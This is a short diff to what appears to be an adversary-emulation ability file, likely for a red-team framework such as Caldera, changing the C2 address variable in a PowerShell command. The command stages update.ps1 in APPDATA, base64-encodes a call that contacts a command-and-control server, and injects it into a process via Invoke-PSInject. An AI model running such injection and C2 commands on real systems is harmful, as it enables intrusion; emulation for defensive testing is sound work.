@@ -15,6 +15,6 @@
         command: |
           Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
           Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
-          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{app.contact.http}')"));
           Inject -PoshCode $pcode;
         payload: update.ps1,Invoke-PSInject.ps1
